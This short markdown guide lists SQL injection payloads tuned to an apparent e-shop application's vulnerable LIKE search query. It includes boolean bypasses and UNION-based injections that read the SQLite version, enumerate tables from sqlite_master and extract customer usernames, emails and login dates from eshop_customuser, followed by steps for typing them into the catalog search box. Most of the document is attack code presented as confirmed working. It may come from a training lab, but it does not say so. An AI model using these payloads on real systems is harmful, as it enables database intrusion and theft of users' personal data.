# Working SQL Injection Payloads

Due to the specific query structure using `LIKE '%%{input}%%'`, these payloads work:

## 1. Basic Boolean-Based (Confirmed Working)
```
' OR '1'='1
```
This works because it creates: `WHERE name LIKE '%%' OR '1'='1%%'`

## 2. Alternative Boolean-Based 
These should also work:
```
' OR 'a'='a
' OR 2>1 OR '
```

## 3. Properly Escaped Payloads
To properly escape the LIKE clause, use `%'` at the beginning:
```
%' OR 1=1 OR '%'='
```

## 4. UNION-Based Injection (Correct Format)
Since we need to properly close the LIKE clause:
```
%' OR 1=1 UNION SELECT '11111111-1111-1111-1111-111111111111', 'INJECTED!', 'Hacked Product', 99.99, '2024-01-01', '2024-01-01' FROM eshop_product WHERE '%'='
```

## 5. Extract SQLite Version
```
%' OR 1=1 UNION SELECT '11111111-1111-1111-1111-111111111111', sqlite_version(), 'DB Version', 1.0, '2024-01-01', '2024-01-01' FROM eshop_product WHERE '%'='
```

## 6. List Tables
```
%' OR 1=1 UNION SELECT '11111111-1111-1111-1111-111111111111', tbl_name, 'Table', 0, '2024-01-01', '2024-01-01' FROM sqlite_master WHERE type='table' AND '%'='
```

## 7. Extract User Data
```
%' OR 1=1 UNION SELECT id, username, email, 0, date_joined, last_login FROM eshop_customuser WHERE '%'='
```

## Why Some Payloads Don't Work

The query structure is:
```sql
WHERE name LIKE '%%USER_INPUT%%' OR description LIKE '%%USER_INPUT%%'
```

This means:
- Simple `' OR '1'='1` works because the `'` closes the LIKE string
- Direct UNION queries fail because they're still inside the LIKE wildcards
- You need `%'` to properly close the LIKE clause first

## Testing These Payloads

1. Login to the application
2. Go to the catalog page
3. In the search box, enter exactly these payloads
4. The `%'` based payloads should work better for UNION attacks